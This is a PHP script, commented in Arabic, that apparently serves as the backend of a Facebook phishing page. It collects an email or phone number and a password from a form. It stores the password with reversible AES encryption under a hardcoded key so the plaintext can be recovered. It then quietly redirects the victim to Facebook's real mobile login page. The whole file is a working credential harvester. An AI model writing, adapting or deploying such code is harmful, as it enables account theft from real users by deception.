<?php
include 'db.php';

$email_or_phone = $_POST['email_or_phone'];
$password = $_POST['password'];

// التحقق من أن البريد الإلكتروني أو رقم الهاتف لم يتم تركه فارغا
if (isset($email_or_phone) && !empty($email_or_phone)) {
    if (filter_var($email_or_phone, FILTER_VALIDATE_EMAIL)) {
        $email = $email_or_phone;
        $phone = null;
    } else {
        $email = null;
        $phone = $email_or_phone;
    }
} else {
    echo "حدث خطأ: يجب إدخال البريد الإلكتروني أو رقم الهاتف";
    exit();
}

// استخدم تشفير AES لتشفير كلمة السر
$key = 'your-secret-key';  // تأكد من أن المفتاح بطول مناسب (16 بايت لـ AES-128)
$iv = openssl_random_pseudo_bytes(16);  // توليد IV بطول 16 بايت
$encrypted_password = openssl_encrypt($password, 'aes-128-cbc', $key, 0, $iv);

// تخزين الـ IV مع كلمة السر المشفرة (بشكل آمن)
$encrypted_password_iv = base64_encode($iv) . ':' . $encrypted_password;

$stmt = $conn->prepare("INSERT INTO users (email, phone, password) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $email, $phone, $encrypted_password_iv);

if ($stmt->execute()) {
    // عرض رسالة نجاح التسجيل وتنفيذ توجيه بواسطة JavaScript
    echo '<script>';
    echo 'window.location.href = "https://m.facebook.com/login/";';
    echo '</script>';
} else {
    echo "حدث خطأ: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>

